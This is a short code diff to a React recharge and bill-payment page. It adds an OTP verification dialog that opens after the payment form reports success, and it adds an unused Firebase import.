@@ -12,6 +12,8 @@ import { EnhancedPaymentForm } from "@/components/payment-form"
 import { SiteHeader } from "@/components/ui/header"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { set } from "firebase/database"
+import { OTPDialog } from "@/components/otp-dialog"
 
 // Define the validation schema
 const rechargeSchema = z
@@ -66,6 +68,7 @@ export default function RechargePage() {
 
   const serviceType = watch("serviceType")
   const [showPayment, setShowPayment] = useState(false)
+  const [showOtp, setShowOtp] = useState(false)
   const [selectedViolations, setSelectedViolations] = useState([])
   const [billData, setBillData] = useState<any | null>(null)
   const [fetchingBill, setFetchingBill] = useState(false)
@@ -301,9 +304,10 @@ export default function RechargePage() {
               onCancel={() => setShowPayment(false)}
               violations={selectedViolations}
               onSuccess={() => {
-                setShowPayment(true)
+                setShowOtp(true)
               }}
             />
+            <OTPDialog isOpen={showOtp} onClose={()=>setShowOtp(false)} phoneNumber={watch('phoneNumber')}/>
           </div>
         )}
       </main>
